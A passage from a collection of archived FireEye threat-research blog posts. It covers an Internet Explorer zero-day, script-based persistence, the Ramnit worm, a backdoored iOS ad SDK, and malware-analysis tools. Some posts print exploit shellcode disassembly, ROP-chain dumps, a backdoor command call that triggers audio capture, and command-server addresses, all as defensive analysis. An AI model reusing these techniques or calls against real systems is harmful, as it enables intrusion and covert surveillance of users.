are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2014/04/new-zero-day-exploit-targeting-internet-explorer-versions-9-through-11-identified-in-targeted-attacks.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2014-04-27",
                    "source": "www.fireeye.com"
                },
                "text": "Summary FireEye Research Labs, the intelligence behind our Mandiant Consultancy services, identified a new Internet Explorer (IE) zero-day exploit used in targeted attacks.  The vulnerability affects IE6 through IE11, but the attack is targeting IE9 through IE11.  This zero-day bypasses both ASLR and DEP. Microsoft has assigned CVE-2014-1776 to the vulnerability and released security advisory to track this issue. Threat actors are actively using this exploit in an ongoing campaign which we have named \"Operation Clandestine Fox.\" However, for many reasons, we will not provide campaign details. But we believe this is a significant zero day as the vulnerable versions represent about a quarter of the total browser market. We recommend applying a patch once available. According to NetMarket Share , the market share for the targeted versions of IE in 2013 were: IE 9      13.9% IE 10    11.04% IE 11     1.32% Collectively, in 2013, the vulnerable versions of IE accounted for 26.25% of the browser market.  The vulnerability, however, does appear in IE6 through IE11 though the exploit targets IE9 and higher. The Details The exploit leverages a previously unknown use-after-free vulnerability, and uses a well-known Flash exploitation technique to achieve arbitrary memory access and bypass Windows’ ASLR and DEP protections. Exploitation • Preparing the heap The exploit page loads a Flash SWF file to manipulate the heap layout with the common technique heap feng shui . It allocates Flash vector objects to spray memory and cover address 0x18184000 . Next, it allocates a vector object that contains a flash.Media.Sound() object, which it later corrupts to pivot control to its ROP chain. • Arbitrary memory access The SWF file calls back to Javascript in IE to trigger the IE bug and overwrite the length field of a Flash vector object in the heapspray. The SWF file loops through the heapspray to find the corrupted vector object, and uses it to again modify the length of another vector object. This other corrupted vector object is then used for subsequent memory accesses, which it then uses to bypass ASLR and DEP. • Runtime ROP generation With full memory control, the exploit will search for ZwProtectVirtualMemory , and a stack pivot (opcode 0x94 0xc3) from NTDLL. It also searches for SetThreadContext in kernel32, which is used to clear the debug registers. This technique, may be an attempt to bypass protections that use hardware breakpoints, such as EMET’s EAF mitigation. With the addresses of the aforementioned APIs and gadget, the SWF file constructs a ROP chain, and prepends it to its RC4 decrypted shellcode. It then replaces the vftable of a sound object with a fake one that points to the newly created ROP payload. When the sound object attempts to call into its vftable, it instead pivots control to the attacker’s ROP chain. • ROP and Shellcode The ROP payload basically tries to make memory at 0x18184000 executable, and to return to 0x1818411c to execute the shellcode. 0:008> dds eax 18184100  770b5f58 ntdll!ZwProtectVirtualMemory 18184104  1818411c 18184108  ffffffff 1818410c  181840e8 18184110  181840ec 18184114  00000040 18184118  181840e4 Inside the shellcode, it saves the current stack pointer to 0x18181800 to safely return to the caller. mov     dword ptr ds:[18181800h],ebp Then, it restores the flash.Media.Sound vftable and repairs the corrupted vector object to avoid application crashes. 18184123 b820609f06      mov     eax,69F6020h 18184128 90              nop 18184129 90              nop 1818412a c700c0f22169    mov     dword ptr [eax],offset Flash32_11_7_700_261!AdobeCPGetAPI+0x42ac00 (6921f2c0) 18184133 b800401818      mov     eax,18184000h 18184138 90              nop 18184139 90              nop 1818413a c700fe030000    mov     dword ptr [eax],3FEh ds:0023:18184000=3ffffff0 The shellcode also recovers the ESP register to make sure the stack range is in the current thread stack base/limit. 18184140 8be5            mov     esp,ebp 18184142 83ec2c          sub     esp,2Ch 18184145 90              nop 18184146 eb2c            jmp     18184174 The shellcode calls SetThreadContext to clear the debug registers. It is possible that this is an attempt to bypass mitigations that use the debug registers. 18184174 57              push    edi 18184175 81ece0050000    sub     esp,5E0h 1818417b c7042410000100  mov     dword ptr [esp],10010h 18184182 8d7c2404        lea     edi,[esp+4] 18184186 b9dc050000      mov     ecx,5DCh 1818418b 33c0            xor     eax,eax 1818418d f3aa            rep stos byte ptr es:[edi] 1818418f 54              push    esp 18184190 6afe            push    0FFFFFFFEh 18184192 b8b308b476      mov     eax,offset kernel32!SetThreadContext (76b408b3) 18184197 ffd0            call    eax The shellcode calls URLDownloadToCacheFileA to download the next stage of the payload, disguised as an image. Mitigation Using EMET may break the exploit in your environment and prevent it from successfully controlling your computer. EMET versions 4.1 and 5.0 break (and/or detect) the exploit in our tests. Enhanced Protected Mode in IE breaks the exploit in our tests. EPM was introduced in IE10. Additionally, the attack will not work without Adobe Flash. Disabling the Flash plugin within IE will prevent the exploit from functioning. Threat Group History The APT group responsible for this exploit has been the first group to have access to a select number of browser-based 0-day exploits (e.g. IE, Firefox, and Flash) in the past. They are extremely proficient at lateral movement and are difficult to track, as they typically do not reuse command and control infrastructure. They have a number of backdoors including one known as Pirpi that we previously discussed here . CVE-2010-3962, then a 0-day exploit in Internet Explorer 6, 7, and 8 dropped the Pirpi payload discussed in this previous case. As this is still an active investigation we are not releasing further indicators about the exploit at this time. Acknowledgement: We thank Christopher Glyer, Matt Fowler, Josh Homan, Ned Moran, Nart Villeneuve and Yichong Lin for their support, research, and analysis on these findings. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2014/02/ground-windows-scripting-host-wsh.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2014-02-19",
                    "source": "www.fireeye.com"
                },
                "text": "About a month ago, I was involved in an investigation that revealed a targeted attacker using an interesting variation of a well-known persistence mechanism - a technique that is relevant both to incident responders hunting for evil and penetration testers looking to add post-exploitation methods to their toolkit. Today, I'm going to talk about this persistence mechanism and discuss some ways you might go about identifying it in your environment. I think that the majority of folks reading this blog have encountered malware that maintains persistence via the startup folder. The startup folder is a directory that may contain binaries, scripts or shortcut files. A folder exists for each user on the system as well as for \"all users.\" On Windows 7, for example, the Administrator startup folder resides at \"C:UsersAdministratorAppDataRoamingMicrosoftWindowsStart MenuProgramsStartup\". When a user successfully authenticates, Windows will attempt to execute any binary, run any script, or follow-up and execute any shortcut that is present within that user's startup folder. If scripts or applications are placed in the \"all users\" startup folder, these will be executed shortly after the system boots. I often see the startup folder used legitimately to execute maintenance scripts written in Visual Basic or in Microsoft's batch scripting language. I also frequently see that applications install shortcut, or LNK, files within the startup folder that point to applications on disk. Malicious use of this directory, however, is most often associated with commodity malware - often accomplished by dropping an executable into the startup folder. I've also seen a few variants of commodity malware that install a LNK file in the startup folder and deploy an EXE into a directory that the user can write to, like \" C: users local settings emp \". LNK files contain several kinds of useful metadata, but for today's purposes we're interested in LNK files as pointers to other files. In this recent case, we identified a novel technique that indirectly loads malicious scripts by means of LNK files in a user's start-up folder. The LNK file was designed to invoke the Windows scripting host (WSH). The WSH comes in both a GUI version, \"wscript.exe\", and a command-line version, \"cscript.exe\". The WSH can interpret Visual Basic scripts, commonly denoted by the file extension \".vbs\", and Jscripts (Microsoft's implementation of JavaScript), commonly denoted by the file extension \".js\". The malicious LNK file invoked \"wscript.exe\" to interpret a JScript file stored within a specific user's profile. Here's a cleaned-up excerpt parsed from the LNK file using lnk-parser , depicting the relative path to the WSH (in yellow) and an argument (in green) which points to a JScript file: The JScript we found used an ActiveXObject object to create an instance of Internet Explorer and open a URL hosted by a code-sharing cloud service. Here's what that looks like: This script connected to a remote system that provided command and control (C2) functionality , which included collecting system information from the infected machine and providing the attacker with the ability to execute commands via the command console, \"cmd.exe\". During analysis of the affected system, we found significant evidence in URL History for the Internet Explorer browser that depicted requests to the malicious URL. The requests for URLs looked like \"http://hostname-4. legitcloudservice .com/?action=get&mt= =\". As depicted in the code snippet above, the base64-encoded string consisted of the Windows domain, username, and NetBIOS name values separated by the pipe (|) character. Though somewhat convoluted and reliant on basic techniques, this persistence mechanism provides several advantages to an attacker. It avoids the need to create or execute a malicious binary on the targeted system, and similarly does not require any registry keys or settings to automatically load upon start-up or user login. This can help bypass application whitelisting and host-based intrusion prevention systems tuned to detect or block such activity. In this specific case, the attacker used network traffic generated by the malicious script to access legitimate, commonly-used web sites via HTTP. This traffic would blend into the normal \"noise\" of an enterprise network and evade detection. One way to detect this form of persistence is to use an IOC that examines files within the Startup folder for references to the WSH. Investigators should examine each LNK file that this IOC identifies to determine whether the WSH is being used to launch a script; investigators should also analyze all scripts for malicious functions and network indicators. Here is an example IOC: Network detection is a little trickier because an attacker could implement network communication in a multitude of ways, depending on the purpose of the script, the scripting language and the protocol. For the example we referenced, the URL parameters \"?action=get&mt=\" might make a good network indicator; here's an example SNORT signature to identify those parameters: Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2021/09/elfant-in-the-room-capa-v3.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2021-09-15",
                    "source": "www.fireeye.com"
                },
                "text": "Since our initial public release of capa , incident responders and reverse engineers have used the tool to automatically identify capabilities in Windows executables. With our newest code and ruleset updates, capa v3 also identifies capabilities in Executable and Linkable Format (ELF) files, such as those used on Linux and other Unix-like operating systems. This blog post describes the extended analysis and other improvements. You can download capa v3 standalone binaries from the project’s release page and checkout the source code on GitHub . ELF File Format Support capa finds capabilities in programs by parsing executable file formats, disassembling code, and then recognizing features in functions. In versions v1 and v2, capa only understood the PE file format, so its analysis was restricted to Windows programs. Thanks to our colleagues at Intezer , capa now recognizes ELF files! This means you can use the tool to identify behaviors in malware that targets Linux computers. Figure 1 shows a rule that describes techniques to fetch the current user on Linux. Figure 1: capa rule identifying capabilities on Linux We’re excited Intezer leverages capa and thrilled they are sharing their improvements with the community. In addition to the code updates, Intezer proposed 36 capa rules to identify various capabilities in ELF files, such as reconnaissance, persistence, and host interaction techniques. Please read Intezer’s blog post for more details. New Features capa Can Recognize As we taught capa to recognize ELF files, we also wanted rule authors to tune their rules to find behaviors specific to different operating systems (OS), CPU architectures, and file formats. For example, the APIs exposed by Windows are very different from those found on Linux systems; therefore, rules should clearly designate which pattern to use on Windows versus Linux. Based on discussions and feedback collected from users and contributors, we've extended capa’s rule format to describe OSes, CPU architectures, and file formats. The rule shown in Figure 2 uses os features to distinguish techniques used to get networking interface information on Windows and Linux. Note that the rule is explicit about which APIs are found on each OS, making it easy for both humans and machines to interpret the matching logic. Figure 2: capa rule using the os feature to distinguish OS specific features We’ve also added arch (such as arch: i386 for 32-bit Intel code) and format (such as format: elf for ELF files) features to distinguish between CPU architectures and file formats. To learn more about these and capa’s rule syntax see the rule format documentation on GitHub. Unfortunately, rules with these new features are not backwards compatible with older versions of capa. Therefore, you should prefer to upgrade your capa installation to take advantage of our enhanced rules. Substring Features To make many rules easier to read, we’ve added a convenience feature named substring that acts like a literal string match with implied leading and trailing wildcards. This makes it easier to match file path components, such as /.ssh/id_rsa . Previously, users had to wrap a substring with forward slashes and escape special characters with backslashes, leading to nearly incomprehensible character sequences. Now, a substring feature clearly describes a literal string found as part of a longer string. Figure 3 shows how much easier it is to read a substring feature. Figure 3: Old- and new-style ways of describing a substring Figure 4 shows a capa rule using a substring feature to describe a persistence location on Linux. Figure 4: capa rule using the substring feature to identify persistence on Linux systems Conclusion The newest improvements add ELF file analysis support to capa and make its rules even more expressive. We thank the community and notably Intezer for their continued support. We love the collaboration and are excited for future opportunities. The v3 capa release also includes bug fixes, improvements to the IDAPython plugin capa explorer , and more than 50 new rules. See the capa changelog for all update details. The new capa release is available on the release page and on PyPI . capa’s code and rules are available on GitHub. If you have any questions or feedback, please open an issue or discussion in the respective repository. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2021/08/announcing-the-eighth-annual-flare-on-challenge.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2021-08-12",
                    "source": "www.fireeye.com"
                },
                "text": "The FLARE team is once again hosting its annual Flare-On challenge, now in its eighth year. Take this opportunity to enjoy some extreme social distancing by solving fun puzzles to test your mettle and learn new tricks on your path to reverse engineering excellence. The contest will begin at 8:00 p.m. ET on Sept. 10, 2021. This is a CTF-style challenge for all active and aspiring reverse engineers, malware analysts, and security professionals. The contest runs for six full weeks and ends at 8:00 p.m. ET on Oct. 22, 2021. This year’s contest will consist of 10 challenges and feature a variety of formats, including Windows, Linux, and JavaScript. This is one of the only Windows-centric CTF contests out there and we have crafted it to represent the skills and challenges our FLARE team faces. If you smash your way through all 10 challenges, you will receive a prize and permanent recognition on the Flare-On website to honor your greatness. Prize details will be revealed later, but as always, it will be worthwhile swag to earn the envy of your peers. Prior year’s prizes were belt buckles, a replica police badge, a challenge coin, a medal, a massive pin, and a cyber-styled skeleton key. Check the Flare-On website for a live countdown timer, to view the previous year’s winners, and to download past challenges and solutions for practice. For official news and information, we will be using the Twitter hashtag: #flareon8. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2016/02/maimed_ramnit_still.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2016-02-18",
                    "source": "www.fireeye.com"
                },
                "text": "Newspapers have the ability to do more than simply keep us current with worldly affairs; we can use them to squash bugs! Yet, as we move from waiting on the newspaper delivery boy to reading breaking news on e Papers, we lose the subtle art of bug squashing. Instead, we end up exposing ourselves to dangerous digital bugs that can affect our virtual worlds. This is exactly what happened to visitors of one of the top five news sites of China. Any users running Internet Explorer (IE) who navigated to the website may have been exposed to an old, yet persistent VBScript worm that has the ability to self-replicate recursively from infected machines. Incidentally, the major actors involved with this old campaign have been taken down, yet traces of their injected recursive malware have still managed to sneak on to one of the highest browsed sites in China. The FireEye Dynamic Threat Intelligence (DTI) first discovered that the site was compromised and used to host VBS/Ramnit on Jan. 28, 2016. We can confirm that the infection is still live as of the time of this writing. IE users who visit the site may be compromised if they browse to a specific page (paperindex[.]htm) and click ‘Yes’ to run ActiveX, which may appear to be safe since the website is familiar and popular. There is no exploit used for infection, simply social engineering and errant clicks. As shown in Figure 1, a malicious VBScript is appeneded after the HTML body. Upon landing on this page, the victim’s browser will load the news content while it executes a malicious ActiveX component in the background. Figure 1: Legitimate HTML page appended with malicious VBScript As shown in Figure 2 and Figure 3, the VBScript drops a binary named “svchost.exe” in the %TEMP% folder and executes it upon successful ActiveX execution. In a case where the system is compromised, it also tries to connect to a CnC server, fget-career[.]com, which has been involved in campaigns for this trojan before. Figure 2: The VBScript drops the binary in the %TEMP% folder and executes it Figure 3: The full path to “svchost.exe” (using Internet Explorer 11 on Windows 7) Successful execution of the VBScript and the delivery of W32.Ramnit onto the victim’s machine depends on the user’s browser, as well as the browser’s setting. Since Chrome and Firefox do not support client-side VBScript, only IE users are susceptible to this attack. Fortunately, recent versions of IE do not run code automatically by default. Instead, users will see two popup warnings when the browser is rendering potentially dangerous objects such as ActiveX components, as shown in Figure 4 and Figure 5. Figure 4: First warning for blocked content in IE 11 Figure 5: Second warning for blocked content in IE 11 Only when the victim clicks on “Yes” will the browser execute the blocked content. In this case, the IE executes the VBScript, drops the payload, and executes it in the background while the user simply sees the usual news page. As long as users click “No” to disallow ActiveX components, they will remain safe from W32.Ramnit. However, this type of social engineering continues to be successful. When a legitimate site is compromised to host exploits or malware, the positive reputation of the site is leveraged to trick users into clicking “Yes” and becoming infected. The potential impact of this particular threat is compounded by the fact that the compromised site is ranked in the Alexa Top 100 for most visited sites internationally, and is in the Top 25 for most popular websites in China [1]. FireEye appliances detect this infection at multiple levels. FireEye’s multiflow detection traces out the complete attack chain, as well as CnC communication. While the CnC host has been suspended for a long time, the worm’s presence alone can be a pain for the victim because it adds itself into all HTML files that it can access. Additionally, it adds itself to the startup registry and impacts the machine’s performance. So the question that you need to ask yourself is this: If a Top 100 Alexa domain is still infected by this veteran malware, are you? Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2015/11/ibackdoor_high-risk.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2015-11-04",
                    "source": "www.fireeye.com"
                },
                "text": "Introduction FireEye mobile researchers recently discovered potentially “backdoored” versions of an ad library embedded in thousands of iOS apps originally published in the Apple App Store. The affected versions of this library embedded functionality in iOS apps that used the library to display ads, allowing for potential malicious access to sensitive user data and device functionality. NOTE: Apple has worked with us on the issue and has since removed the affected apps. These potential backdoors could have been controlled remotely by loading JavaScript code from a remote server to perform the following actions on an iOS device: Capture audio and screenshots Monitor and upload device location Read/delete/create/modify files in the app’s data container Read/write/reset the app’s keychain (e.g., app password storage) Post encrypted data to remote servers Open URL schemes to identify and launch other apps installed on the device “Side-load” non-App Store apps by prompting the user to click an “Install” button The offending ad library contained identifying data suggesting that it is a version of the mobiSage SDK [1]. We found 17 distinct versions of the potentially backdoored ad library: version codes 5.3.3 to 6.4.4. However, in the latest mobiSage SDK publicly released by adSage [2] – version 7.0.5 – the potential backdoors are not present. It is unclear whether the potentially backdoored versions of the ad library were released by adSage or if they were created and/or compromised by a malicious third party. As of November 4, we have identified 2,846 iOS apps containing the potentially backdoored versions of mobiSage SDK. Among these, we observed more than 900 attempts to contact an ad adSage server capable of delivering JavaScript code to control the backdoors. We notified Apple of the complete list of affected apps and technical details on October 21, 2015. While we have not observed the ad server deliver any malicious commands intended to trigger the most sensitive capabilities such as recording audio or stealing sensitive data, affected apps periodically contact the server to check for new JavaScript code. In the wrong hands, malicious JavaScript code that triggers the potential backdoors could be posted to eventually be downloaded and executed by affected apps. Technical Details As shown in Figure 1, the affected mobiSage library included two key components, separately implemented in Objective-C and JavaScript. The Objective-C component, which we refer to as msageCore , implements the underlying functionality of the potential backdoors and exposed interfaces to the JavaScript context through a WebView. The JavaScript component, which we refer to as msageJS , provides high-level execution logic and can trigger the potential backdoors by invoking the interfaces exposed by msageCore. Each component has its own separate version number. Figure 1: Key components of backdoored mobiSage SDK In the remainder of this section, we reveal internal details of msageCore, including its communication channel and high-risk interfaces. Then we describe how msageJS is launched and updated, and how it can trigger the backdoors. Backdoors in msageCore Communication channel MsageCore implements a general framework to communicate with msageJS via the ad library’s WebView. Commands and parameters are passed via specially crafted URLs in the format adsagejs://cmd&parameter. As shown in the reconstructed code fragment in Figure 2, msageCore fetches the command and parameters from the JavaScript context and inserts them in its command queue. Figure 2: Communication via URL loading in WebView To process a command in its queue, msageCore dispatches the command, along with its parameters, to a corresponding Objective-C class and method. Figure 3 shows portions of the reconstructed command dispatching code. Figure 3: Command dispatch in msageCore At-risk interfaces Each dispatched command ultimately arrives at an Objective-C class in msageCore. Table 1 shows a subset of msageCore classes and the corresponding interfaces that they expose. msageCore Class Name Interfaces MSageCoreUIManagerPlugin - captureAudio: - captureImage: - openMail: - openSMS: - openApp: - openInAppStore: - openCamera: - openImagePicker: - ... MSageCoreLocation - start: - stop: - setTimer: - returnLocationInfo:webViewId: - ... MSageCorePluginFileModule - createDir - deleteDir: - deleteFile: - createFile: - getFileContent: - ... MSageCoreKeyChain - writeKeyValue: - readValueByKey: - resetValueByKey: MSageCorePluginNetWork - sendHttpGet: - sendHttpPost: - sendHttpUpload: - ... MSageCoreEncryptPlugin - MD5Encrypt: - SHA1Encrypt: - AESEncrypt: - AESDecrypt: - DESEncrypt: - DESDecrypt: - XOREncrypt: - XORDecrypt: - RC4Encrypt: - RC4Decrypt - ... Table 1: Selected interfaces exposed by msageCore The selected interfaces reveal some of the key capabilities exposed by the potential backdoors in the library. They expose the potential ability to capture audio and screenshots while the affected app is in use, identify and launch other apps installed on the device, periodically monitor location, read and write files in the app’s data container, and read/write/reset “secure” keychain items stored by the app. Additionally, any data collected via these interfaces can be encrypted with various encryption schemes and uploaded to a remote server. Beyond the selected interfaces, the ad library potentially exposed users to additional risks by including logic to promote and install “enpublic” apps as shown in Figure 4. As we have highlighted in previous blogs [footnotes 3, 4, 5, 6, 7], enpublic apps can introduce additional security risks by using private APIs in certain versions of iOS. These private APIs potentially allow for background monitoring of SMS or phone calls, breaking the app sandbox, stealing email messages, and demolishing arbitrary app installations. Apple has addressed a number of issues related to enpublic apps that we have brought to their attention. Figure 4: Installing “enpublic” apps to bypass Apple App Store review We can see how this ad library functions by examining the implementations of some of the selected interfaces. Figure 5 shows reconstructed code snippets for capturing audio. Before storing recorded audio to a file audio_xxx.wav , the code retrieves two parameters from the command for recording duration and threshold. Figure 5: Capturing audio with duration and threshold Figure 6 shows a code snippet for initializing the app’s keychain before reading. The accessed keychain is in the kSecClassGenericPassword class, which is widely used by apps for storing secret credentials such as passwords. Figure 6: Reading the keychain in the kSecClassGenericPassword class Remote control in msageJS msageJS contains JavaScript code for communicating with a remote server and submitting commands to msageCore. The file layout of msageJS is shown in Figure 7. Inside sdkjs.js , we find a wrapper object called adsage and the JavaScript interface for command execution. Figure 7: The file layout of msageJS The command execution interface is constructed as follows: adsage.exec(className, methodName, argsList, onSuccess, onFailure); The className and methodName parameters correspond to classes and methods in msageCore. The argsList parameter can be either a list or dict, and the exact types and values can be determined by reversing the methods in msageCore. The final two parameters are function callbacks invoked when the method exits. For example, the following invocation starts audio capture: adsage.exec(\"MSageCoreUIManager\", \"captureAudio\", [\"Hey\", 10, 40],  onSuccess, onFailure); Note that the files comprising msageJS cannot be found by simply listing the files in an affected app’s IPA. The files themselves are zipped and encoded in Base64 in the data section of the ad library binary. After an affected app is launched, msageCore first decodes the string and extracts msageJS to the app’s data container, setting index.html shown in Figure 7 as the landing page in the ad library WebView to launch msageJS. Figure 8: Base64 encoded JavaScript component in Zip format When msageJS is launched, it sends a POST request to hxxp://entry.adsage.com/d/ to check for updates. The server responds with information about the latest msageJS version, including a download URL, as shown in Figure 9. Figure 9: Server response to msageJS update request via HTTP POST Enterprise Protection To ensure the protection of our customers, FireEye has deployed detection rules in its Network Security (NX) and Mobile Threat Prevention (MTP) products to identify the affected apps and their network activities. For FireEye NX customers, alerts will be generated if an employee uses an infected app while their iOS device is connected to the corporate network. FireEye MTP management customers have full visibility into high-risk apps installed on mobile devices in their deployment base. End users will receive on-device notifications of the risky app and IT administrators receive email alerts. Conclusion In this blog, we described an ad library that affected thousands of iOS apps with potential backdoor functionality. We revealed the internals of backdoors which could be used to trigger audio recording, capture screenshots, prompt the user to side-load other high-risk apps, and read sensitive data from the app’s keychain, among other dubious capabilities. We also showed how these potential backdoors in ad libraries could be controlled remotely by JavaScript code should their ad servers fall under malicious actors’ control. [2] http://www.adsage.cn/ [3] https://www.fireeye.com/blog/threat-research/2015/08/ios_masque_attackwe.html [4] https://www.fireeye.com/blog/threat-research/2015/02/ios_masque_attackre.html [5] https://www.fireeye.com/blog/threat-research/2014/11/masque-attack-all-your-ios-apps-belong-to-us.html [6] https://www.fireeye.com/blog/threat-research/2015/06/three_new_masqueatt.html [7] https://www.virusbtn.com/virusbulletin/archive/2014/11/vb201411-Apple-without-shell Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2014/09/flare-ida-pro-script-series-msdn-annotations-ida-pro-for-malware-analysis.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2014-09-11",
                    "source": "www.fireeye.com"
                },
                "text": "The FireEye Labs Advanced Reverse Engineering (FLARE) Team continues to share knowledge and tools with the community. We started this blog series with a script for Automatic Recovery of Constructed Strings in Malware . As always, you can download these scripts at the following location: https://github.com/fireeye/flare-ida . We hope you find all these scripts as useful as we do. Motivation During my summer internship with the FLARE team, my goal was to develop IDAPython plug-ins that speed up the reverse engineering workflow in IDA Pro. While analyzing malware samples with the team, I realized that a lot of time is spent looking up information about functions, arguments, and constants at the Microsoft Developer Network (MSDN) website. Frequently switching to the developer documentation can interrupt the reverse engineering process, so we thought about ways to integrate MSDN information into IDA Pro automatically. In this blog post we will release a script that does just that, and we will show you how to use it. Introduction The MSDN Annotations plug-in integrates information about functions, arguments and return values into IDA Pro’s disassembly listing in the form of IDA comments. This allows the information to be integrated as seamlessly as possible. Additionally, the plug-in is able to automatically rename constants, which further speeds up the analyst workflow. The plug-in relies on an offline XML database file, which is generated from Microsoft’s documentation and IDA type library files. Features Table 1 shows what benefit the plug-in provides to an analyst. On the left you can see IDA Pro’s standard disassembly: seven arguments get pushed onto the stack and then the CreateFileA function is called. Normally an analyst would have to look up function, argument and possibly constant descriptions in the documentation to understand what this code snippet is trying to accomplish. To obtain readable constant values, an analyst would be required to research the respective argument, import the corresponding standard enumeration into IDA and then manually rename each value. The right side of Table 1 shows the result of executing our plug-in showing the support it offers to an analyst. The most obvious change is that constants are renamed automatically. In this example, 40000000h was automatically converted to GENERIC_WRITE. Additionally, each function argument is renamed to a unique name, so the corresponding description can be added to the disassembly. Table 1: Automatic labelling of standard symbolic constants In Figure 1 you can see how the plug-in enables you to display function, argument, and constant information right within the disassembly. The top image shows how hovering over the CreateFileA function displays a short description and the return value. In the middle image, hovering over the hTemplateFile argument displays the corresponding description. And in the bottom image, you can see how hovering over dwShareMode, the automatically renamed constant displays descriptive information. Functions Arguments Constants Figure 1: Hovering function names, arguments and constants displays the respective descriptions How it works Before the plug-in makes any changes to the disassembly, it creates a backup of the current IDA database file (IDB). This file gets stored in the same directory as the current database and can be used to revert to the previous markup in case you do not like the changes or something goes wrong. The plug-in is designed to run once on a sample before you start your analysis. It relies on an offline database generated from the MSDN documentation and IDA Pro type library (TIL) files. For every function reference in the import table, the plug-in annotates the function’s description and return value, adds argument descriptions, and renames constants. An example of an annotated import table is depicted in Figure 2. It shows how a descriptive comment is added to each API function call. In order to identify addresses of instructions that position arguments prior to a function call, the plug-in relies on IDA Pro’s markup. Figure 2: Annotated import table Figure 3 shows the additional .msdn segment the plug-in creates in order to store argument descriptions. This only impacts the IDA database file and does not modify the original binary. Figure 3: The additional segment added to the IDA database The .msdn segment stores the argument descriptions as shown in Figure 4. The unique argument names and their descriptive comments are sequentially added to the segment. Figure 4: Names and comments inserted for argument descriptions To allow the user to see constant descriptions by hovering over constants in the disassembly, the plug-in imports IDA Pro’s relevant standard enumeration and adds descriptive comments to the enumeration members. Figure 5 shows this for the MACRO_CREATE enumeration, which stores constants passed as dwCreationDisposition to CreateFileA. Figure 5: Descriptions added to the constant enumeration members Preparing the MSDN database file The plug-in’s graphical interface requires you to have the QT framework and Python scripting installed. This is included with the IDA Pro 6.6 release. You can also set it up for IDA 6.5 as described here ( http://www.hexblog.com/?p=333 ). As mentioned earlier, the plug-in requires an XML database file storing the MSDN documentation. We cannot distribute the database file with the plug-in because Microsoft holds the copyright for it. However, we provide a script to generate the database file. It can be cloned from the git repository at https://github.com/fireeye/flare-ida together with the annotation plug-in. You can take the following steps to setup the database file. You only have to do this once. Download and install an offline version of the MSDN documentationYou can download the Microsoft Windows SDK MSDN documentation. The standalone installer can be downloaded from http://www.microsoft.com/en-us/download/details.aspx?id=18950 . Although it is not the newest SDK version, it includes all the needed information and data extraction is straight-forward.As shown in Figure 6, you can select to only install the help files. By default they are located in C:\\Program Files\\Microsoft SDKs\\Windows\\v7.0\\Help\\1033. Figure 6: Installing a local copy of the MSDN documentation Extract the files with an archive manager like 7-zip to a directory of your choice. Download and extract tilib.exe from Hex-Ray’s download page at https://www.hex-rays.com/products/ida/support/download.shtml To allow the plug-in to rename constants, it needs to know which enumerations to import. IDA Pro stores this information in TIL files located in %IDADIR%/til/. Hex-Rays provides a tool (tilib) to show TIL file contents via their download page for registered users. Download the tilib archive and extract the binary into %IDADIR%. If you run tilib without any arguments and it displays its help message, the program is running correctly. Run MSDN_crawler/msdn_crawler.py <path to extracted MSDN documentation> <path to tilib.exe> <path to til files> With these prerequisites fulfilled, you can run the MSDN_crawler.py script, located in the MSDN_crawler directory. It expects the path to the TIL files you want to extract (normally %IDADIR%/til/pc/) and the path to the extracted MSDN documentation. After the script finishes execution the final XML database file should be located in the MSDN_data directory. You can now run our plug-in to annotate your disassembly in IDA. Running the MSDN annotations plug-in In IDA, use File - Script file... (ALT + F7) to open the script named annotate_IDB_MSDN.py. This will display the dialog box shown in Figure 7 that allows you to configure the modifications the plug-in performs. By default, the plug-in annotates functions, arguments and rename constants. If you change the settings and execute the plug-in by clicking OK, your settings get stored in a configuration file in the plug-in’s directory. This allows you to quickly run the plug-in on other samples using your preferred settings. If you do not choose to annotate functions and/or arguments, you will not be able to see the respective descriptions by hovering over the element. Figure 7: The plug-in’s configuration window showing the default settings When you choose to use repeatable comments for function name annotations, the description is visible in the disassembly listing, as shown in Figure 8. Figure 8: The plug-in’s preview of function annotations with repeatable comments Similar Tools and Known Limitations Parts of our solution were inspired by existing IDA Pro plug-ins, such as IDAScope and IDAAPIHelp . A special thank you goes out to Zynamics for their MSDN crawler and the IDA importer which greatly supported our development. Our plug-in has mainly been tested on IDA Pro for Windows, though it should work on all platforms. Due to the structure of the MSDN documentation and limitations of the MSDN crawler, not all constants can be parsed automatically. When you encounter missing information you can extend the annotation database by placing files with supplemental information into the MSDN_data directory. In order to be processed correctly, they have to be valid XML following the schema given in the main database file (msdn_data.xml). However, if you want to extend partly existing function information, you only have to add the additional fields. Name tags are mandatory for this, as they get used to identify the respective element. For example, if the parser did not recognize a commonly used constant, we could add the information manually. For the CreateFileA function’s dwDesiredAccess argument the additional information could look similar to Listing 1. <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <msdn> <functions> <function> <name>CreateFileA</name> <arguments> <argument> <name>dwDesiredAccess</name> <constants enums=\"MACRO_GENERIC\"> <constant> <name>GENERIC_ALL</name> <value>0x10000000</value> <description>All possible access rights</description> </constant> <constant> <name>GENERIC_EXECUTE</name> <value>0x20000000</value> <description>Execute access</description> </constant> <constant> <name>GENERIC_WRITE</name> <value>0x40000000</value> <description>Write access</description> </constant> <constant> <name>GENERIC_READ</name> <value>0x80000000</value> <description>Read access</description> </constant> </constants> </argument> </arguments> </function> </functions> </msdn> Listing 1: Additional information enhancing the dwDesiredAccess argument for the CreateFileA function Conclusion In this post, we showed how you can generate a MSDN database file used by our plug-in to automatically annotate information about functions, arguments and constants into IDA Pro’s disassembly. Furthermore, we talked about how the plug-in works, and how you can configure and customize it. We hope this speeds up your analysis process! Stay 